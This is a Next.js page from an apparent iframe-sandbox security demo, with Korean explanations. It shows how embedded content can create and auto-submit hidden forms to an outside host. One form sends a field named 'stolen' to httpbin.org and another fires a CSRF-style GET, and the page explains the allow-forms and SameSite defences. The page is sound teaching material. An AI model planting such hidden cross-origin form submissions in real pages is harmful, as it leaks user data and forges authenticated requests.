"use client";

import { useRef } from "react";
import { findScenario } from "@/lib/scenarios";
import { ScenarioHeader } from "@/app/ScenarioHeader";
import { EmbedSnippet } from "@/app/EmbedSnippet";
import { Log, useLog } from "@/app/Log";

const FormAutoSubmitPage = () => {
  const scenario = findScenario("form-auto-submit")!;
  const { lines, push, clear } = useLog();
  const formRef = useRef<HTMLFormElement>(null);

  const submitToExternal = () => {
    push("외부 도메인으로 hidden form submit");
    const form = document.createElement("form");
    form.method = "POST";
    form.action = "https://httpbin.org/post";
    form.target = "_blank";
    const input = document.createElement("input");
    input.name = "stolen";
    input.value = "data-from-iframe";
    form.appendChild(input);
    document.body.appendChild(form);
    form.submit();
    form.remove();
    push(
      "submit 호출 완료. allow-forms 가 없으면 차단되고, 있으면 새 창에 응답이 뜸"
    );
  };

  const submitGet = () => {
    push("GET form submit (CSRF-style)");
    push(
      "공격 가치: 타깃 사이트에 인증된 사용자 쿠키가 자동 첨부되면 CSRF 성립. SameSite=Lax 가 기본이라 대부분 차단됨."
    );
    const form = document.createElement("form");
    form.method = "GET";
    form.action = "https://httpbin.org/get";
    form.target = "_blank";
    const input = document.createElement("input");
    input.name = "csrf";
    input.value = "fired";
    form.appendChild(input);
    document.body.appendChild(form);
    form.submit();
    form.remove();
    push("submit 호출 완료");
  };

  return (
    <>
      <ScenarioHeader scenario={scenario} />
      <EmbedSnippet slug="form-auto-submit" />

      <h2>실행</h2>
      <div className="actions">
        <button className="danger" onClick={submitToExternal}>
          POST submit (외부)
        </button>
        <button className="danger" onClick={submitGet}>
          GET submit (외부)
        </button>
        <button onClick={clear}>로그 초기화</button>
      </div>
      <Log lines={lines} />

      <form ref={formRef} style={{ display: "none" }} />

      <h2>해설</h2>
      <ul>
        <li>
          form submit 은 cross-origin 으로 자유롭게 보낼 수 있습니다. 문제는
          타깃 사이트가 SameSite=Lax/Strict 쿠키를 쓰는지에 따라 CSRF 가능 여부가
          결정됩니다.
        </li>
        <li>
          <code>sandbox</code> 에 <code>allow-forms</code> 가 없으면 submit 자체가
          차단됩니다. 신뢰 호스트만 allowlist 로 받지 않는다면 이
          키워드는 빼는 게 안전합니다.
        </li>
        <li>
          참고: 외부 도메인으로 보낸 응답을 iframe 안에서 읽을 수는 없습니다
          (SOP). 하지만 &quot;요청이 도달했다&quot; 자체가 공격일 때가 많습니다.
        </li>
      </ul>
    </>
  );
};

export default FormAutoSubmitPage;
